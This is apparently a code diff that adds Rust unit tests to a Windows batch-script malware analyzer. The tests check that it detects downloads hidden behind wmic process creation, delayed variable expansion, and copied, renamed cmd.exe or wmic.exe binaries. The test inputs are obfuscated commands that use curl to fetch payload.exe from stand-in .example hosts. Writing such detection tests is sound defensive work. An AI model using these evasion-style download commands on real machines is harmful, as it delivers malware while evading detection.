@@ -13063,6 +13063,43 @@ mod wmic_tests {
             report.traits
         );
     }
+
+    #[test]
+    fn wmic_process_call_create_preserves_escaped_delayed_comspec_child() {
+        let script = br#"setlocal EnableDelayedExpansion
+wmic process call create "%COMSPEC% /V:ON /c set U=https://wmic-escaped.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wmic-escaped.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "escaped wmic COMSPEC child did not preserve delayed expansion: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn wmic_process_call_create_comspec_v_on_preserves_escaped_delayed_child() {
+        let script = br#"wmic process call create "%COMSPEC% /V:ON /c set U=https://wmic-von-escaped.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wmic-von-escaped.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "wmic COMSPEC /V:ON child did not preserve escaped delayed expansion: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
@@ -24071,6 +24108,41 @@ C:\Users\Public\cm.tmp /V:ON /c set U=https://copied-cmd-delayed.example/payload
     }
 
     #[test]
+    fn copied_cmd_alias_r_child_preserves_escaped_delayed_expansion() {
+        let report = analyze(
+            br#"copy C:\Windows\System32\cmd.exe C:\Users\Public\cm.tmp
+C:\Users\Public\cm.tmp /V:ON /r set U=https://copied-cmd-r.example/payload.exe&&curl -o payload.exe ^!U^!
+"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\cm.tmp"#
+                )
+            }),
+            "copied cmd /r alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://copied-cmd-r.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "copied cmd /r child command was not analyzed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn copied_wmic_alias_process_call_create_child_is_analyzed() {
         let report = analyze(
             br#"copy C:\Windows\System32\wbem\wmic.exe C:\Users\Public\wm.tmp
@@ -24110,6 +24182,29 @@ C:\Users\Public\wm.tmp process call create "cmd /c curl -o out.exe https://copie
             }),
             "copied wmic child download not surfaced: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn copied_wmic_alias_comspec_child_preserves_escaped_delayed_expansion() {
+        let report = analyze(
+            br#"copy C:\Windows\System32\wbem\wmic.exe C:\Users\Public\wm.tmp
+C:\Users\Public\wm.tmp process call create "%COMSPEC% /V:ON /c set U=https://copied-wmic-delayed.example/payload.exe&&curl -o payload.exe ^!U^!""#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://copied-wmic-delayed.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "copied wmic escaped delayed child was not analyzed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
         );
     }
 
